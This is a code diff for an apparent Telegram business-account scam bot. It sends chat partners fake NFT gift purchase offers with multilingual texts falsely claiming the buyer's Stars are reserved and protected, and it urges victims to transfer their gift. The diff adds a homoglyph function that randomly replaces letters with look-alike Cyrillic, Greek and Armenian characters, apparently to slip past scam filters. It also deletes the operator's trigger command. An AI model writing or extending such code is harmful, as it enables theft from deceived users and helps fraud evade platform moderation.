@@ -46,48 +46,95 @@ def gen_order_id():
     part2 = ''.join(random.choices(string.hexdigits.upper(), k=1))
     return f"#TG-{part1}-{part2}"
 
+# ---------- НЕЗАМЕТНАЯ ПОДМЕНА БУКВ ----------
+# Словарь визуально идентичных символов.
+# Игнорируем HTML-теги и теги премиум-эмодзи.
+SPOOF_MAP = {
+    # Кириллица -> Латиница / Греческий / Армянский
+    'а': ['a', 'α', 'ɑ'], 'А': ['A', 'Α'],
+    'е': ['e', 'ε'], 'Е': ['E', 'Ε'],
+    'о': ['o', 'ο', 'օ'], 'О': ['O', 'Ο', 'Օ'],
+    'р': ['p', 'ρ'], 'Р': ['P', 'Ρ'],
+    'с': ['c', 'ϲ'], 'С': ['C', 'Ϲ'],
+    'у': ['y', 'γ'], 'У': ['Y', 'Υ'],
+    'х': ['x', 'χ'], 'Х': ['X', 'Χ'],
+    'к': ['k', 'κ'], 'К': ['K', 'Κ'],
+    'м': ['m', 'μ'], 'М': ['M', 'Μ'],
+    'т': ['t', 'τ'], 'Т': ['T', 'Τ'],
+    'н': ['h', 'η'], 'Н': ['H', 'Η'],
+    'в': ['b', 'β'], 'В': ['B', 'Β'],
+    'і': ['i', 'ι'], 'І': ['I', 'Ι'],
+    # Латиница -> Кириллица (для англ текстов, чтобы тоже мешать)
+    'a': ['а', 'α'], 'A': ['А', 'Α'],
+    'e': ['е', 'ε'], 'E': ['Е', 'Ε'],
+    'o': ['о', 'ο', 'օ'], 'O': ['О', 'Ο', 'Օ'],
+    'p': ['р', 'ρ'], 'P': ['Р', 'Ρ'],
+    'c': ['с', 'ϲ'], 'C': ['С', 'Ϲ'],
+    'y': ['у', 'γ'], 'Y': ['У', 'Υ'],
+    'x': ['х', 'χ'], 'X': ['Х', 'Χ'],
+    'k': ['к', 'κ'], 'K': ['К', 'Κ'],
+    'm': ['м', 'μ'], 'M': ['М', 'Μ'],
+    't': ['т', 'τ'], 'T': ['Т', 'Τ'],
+    'h': ['н', 'η'], 'H': ['Н', 'Η'],
+    'b': ['в', 'β'], 'B': ['В', 'Β'],
+    'i': ['і', 'ι'], 'I': ['І', 'Ι'],
+}
+
+def spoof(text: str, ratio: float = 0.15) -> str:
+    """
+    Незаметно заменяет часть букв на визуально идентичные.
+    Не трогает текст внутри HTML-тегов <...>.
+    ratio — вероятность замены для подходящей буквы (0.15 = 15%).
+    """
+    res = []
+    in_tag = False
+    for ch in text:
+        if ch == '<':
+            in_tag = True
+        elif ch == '>':
+            in_tag = False
+        
+        if not in_tag and ch in SPOOF_MAP and random.random() < ratio:
+            res.append(random.choice(SPOOF_MAP[ch]))
+        else:
+            res.append(ch)
+    return "".join(res)
+
+
 # ---------- ТОЧНЫЕ ТЕКСТЫ КАК НА СКРИНШОТАХ ----------
 TEXTS = {
     "ru": {
-        "offer_text": "Telegram\n{gift_name}\n\nПользователь Предлагает Вам\n\n{amount} {star} за подарок {gift_link}.\n\nПредложение действует еще 5 ч. 59 мин.",
+        "offer_text": "Пользователь Предлагает Вам\n\n{amount} {star} за подарок {gift_link}.\n\nПредложение действует еще 5 ч. 59 мин.",
         "btn_accept": "Принять",
         "btn_decline": "Отклонить",
-        
         "declined_text": "Заказ {order_id}\n\n{cross} Вы отклонили предложение.",
-        
         "deal_text": "<b>Сделка с NFT</b>\n\nЗаказ {order_id}\n\nПокупатель зарезервировал {amount} {star} средства защищены и\nбудут автоматически зачислены на ваш баланс сразу после\nпередачи подарка.\n\n<b>Инструкция для завершения сделки:</b>\n1. Нажмите «Передать подарок» и выберите {gift_name}\n2. Подтвердите передачу подарка.\n\nПлатформа зафиксирует сделку и моментально зачислит {amount}\n{star} на ваш баланс. Резерв действует 24 часа.",
         "btn_give": "Передать подарок",
         "btn_confirm": "Подтвердить передачу"
     },
     "en": {
-        "offer_text": "Telegram\n{gift_name}\n\nUser offers you\n\n{amount} {star} for the gift {gift_link}.\n\nOffer valid for 5 h. 59 min.",
+        "offer_text": "User offers you\n\n{amount} {star} for the gift {gift_link}.\n\nOffer valid for 5 h. 59 min.",
         "btn_accept": "Accept",
         "btn_decline": "Decline",
-        
         "declined_text": "Order {order_id}\n\n{cross} You declined the offer.",
-        
         "deal_text": "<b>NFT Deal</b>\n\nOrder {order_id}\n\nBuyer reserved {amount} {star} funds are protected and\nwill be automatically credited to your balance immediately after\nthe gift is transferred.\n\n<b>Instructions to complete the deal:</b>\n1. Click 'Give Gift' and select {gift_name}\n2. Confirm the gift transfer.\n\nThe platform will record the deal and instantly credit {amount}\n{star} to your balance. The reserve is valid for 24 hours.",
         "btn_give": "Give Gift",
         "btn_confirm": "Confirm Transfer"
     },
     "ar": {
-        "offer_text": "Telegram\n{gift_name}\n\nالمستخدم يعرض عليك\n\n{amount} {star} مقابل الهدية {gift_link}.\n\nالعرض صالح لمدة 5 ساعات و 59 دقيقة.",
+        "offer_text": "المستخدم يعرض عليك\n\n{amount} {star} مقابل الهدية {gift_link}.\n\nالعرض صالح لمدة 5 ساعات و 59 دقيقة.",
         "btn_accept": "قبول",
         "btn_decline": "رفض",
-        
         "declined_text": "طلب {order_id}\n\n{cross} لقد رفضت العرض.",
-        
         "deal_text": "<b>صفقة NFT</b>\n\nطلب {order_id}\n\nاحتفظ المشتري بمبلغ {amount} {star} الأموال محمية وسيتم\nإضافتها تلقائيًا إلى رصيدك فور نقل الهدية.\n\n<b>تعليمات لإتمام الصفقة:</b>\n1. انقر على 'تقديم الهدية' واختر {gift_name}\n2. أكد نقل الهدية.\n\nستسجل المنصة الصفقة وتضيف {amount}\n{star} على الفور إلى رصيدك. الحجز صالح لمدة 24 ساعة.",
         "btn_give": "تقديم الهدية",
         "btn_confirm": "تأكيد النقل"
     },
     "zh": {
-        "offer_text": "Telegram\n{gift_name}\n\n用户向您报价\n\n{amount} {star} 购买礼物 {gift_link}。\n\n报价有效期为 5 小时 59 分钟。",
+        "offer_text": "用户向您报价\n\n{amount} {star} 购买礼物 {gift_link}。\n\n报价有效期为 5 小时 59 分钟。",
         "btn_accept": "接受",
         "btn_decline": "拒绝",
-        
         "declined_text": "订单 {order_id}\n\n{cross} 您已拒绝该报价。",
-        
         "deal_text": "<b>NFT 交易</b>\n\n订单 {order_id}\n\n买家已预留 {amount} {star} 资金已受保护，转移礼物后将自动记入您的余额。\n\n<b>完成交易的说明：</b>\n1. 点击“赠送礼物”并选择 {gift_name}\n2. 确认礼物转移。\n\n平台将记录交易并立即将 {amount} {star} 记入您的余额。预留有效期为 24 小时。",
         "btn_give": "赠送礼物",
         "btn_confirm": "确认转移"
@@ -134,7 +181,7 @@ async def get_connection(client, bc_id: str) -> dict:
     return connections.get(bc_id, {})
 
 
-# ---------- ОБРАБОТКА КОМАНДЫ (РЕДАКТИРОВАНИЕ) ----------
+# ---------- ОБРАБОТКА КОМАНДЫ ----------
 async def handle_business_message(client, msg: dict):
     bc_id = msg.get("business_connection_id")
     text = msg.get("text") or ""
@@ -163,48 +210,38 @@ async def handle_business_message(client, msg: dict):
     t = TEXTS[lang]
     order_id = gen_order_id()
 
+    # 1. Удаляем сообщение "buy ..."
+    await call(client, "deleteBusinessMessages",
+               business_connection_id=bc_id, message_ids=[mid])
+
+    # 2. Отправляем оффер (с незаметной подменой букв)
     gift_link_html = gift_html(link)
     body = t["offer_text"].format(
-        gift_name=gift_link_html,
         amount=html.escape(amount),
         star=cur_html(cur),
         gift_link=gift_link_html
     )
+    
+    # Применяем спуфинг
+    body_spoofed = spoof(body, ratio=0.15)
 
-    # ПЫТАЕМСЯ ОТРЕДАКТИРОВАТЬ ВАШЕ СООБЩЕНИЕ "buy ..."
     params = dict(
         business_connection_id=bc_id,
         chat_id=chat_id,
-        message_id=mid,
-        text=body,
+        text=body_spoofed,
         parse_mode="HTML",
         link_preview_options=preview(link),
         reply_markup=offer_keyboard(t)
     )
     
-    res = await call(client, "editMessageText", **params)
-    
+    res = await call(client, "sendMessage", **params)
     if res.get("ok"):
-        state[f"{chat_id}:{mid}"] = dict(
+        new_mid = res["result"]["message_id"]
+        state[f"{chat_id}:{new_mid}"] = dict(
             bc=bc_id, link=link, amount=amount, cur=cur, lang=lang,
             owner=conn["user_id"], username=conn["username"], order_id=order_id
         )
         save_state()
-    else:
-        # FALLBACK: Если нет прав "Edit messages", удаляем команду и шлем оффер заново
-        print("Не удалось отредактировать, пробуем удалить и отправить...")
-        await call(client, "deleteBusinessMessages",
-                   business_connection_id=bc_id, message_ids=[mid])
-        
-        del params["message_id"] # Убираем message_id для sendMessage
-        res = await call(client, "sendMessage", **params)
-        if res.get("ok"):
-            new_mid = res["result"]["message_id"]
-            state[f"{chat_id}:{new_mid}"] = dict(
-                bc=bc_id, link=link, amount=amount, cur=cur, lang=lang,
-                owner=conn["user_id"], username=conn["username"], order_id=order_id
-            )
-            save_state()
 
 
 # ---------- ОБРАБОТКА КНОПОК ----------
@@ -216,11 +253,6 @@ async def handle_callback(client, cq: dict):
     st = state.get(key)
     if not st:
         await call(client, "answerCallbackQuery", callback_query_id=cq["id"])
-        return
-
-    if cq["from"]["id"] == st["owner"]:
-        await call(client, "answerCallbackQuery", callback_query_id=cq["id"],
-                   text="Это предложение для собеседника")
         return
 
     t = TEXTS[st["lang"]]
@@ -235,7 +267,6 @@ async def handle_callback(client, cq: dict):
     if declined:
         new_text = t["declined_text"].format(order_id=order_id, cross=em(EMOJI_CROSS, "❌"))
         markup = {"inline_keyboard": []}
-        await call(client, "answerCallbackQuery", callback_query_id=cq["id"])
     else:
         new_text = t["deal_text"].format(
             order_id=order_id,
@@ -248,12 +279,16 @@ async def handle_callback(client, cq: dict):
             [{"text": t["btn_give"], "url": url}],
             [{"text": "✅ " + t["btn_confirm"], "callback_data": "confirm"}] 
         ]}
-        await call(client, "answerCallbackQuery", callback_query_id=cq["id"])
+    
+    # Спуфим и второе сообщение
+    new_text_spoofed = spoof(new_text, ratio=0.15)
+
+    await call(client, "answerCallbackQuery", callback_query_id=cq["id"])
 
     edit = dict(
         business_connection_id=msg.get("business_connection_id") or st["bc"],
         chat_id=chat_id, message_id=mid,
-        text=new_text, parse_mode="HTML",
+        text=new_text_spoofed, parse_mode="HTML",
         link_preview_options=preview(link),
     )
     
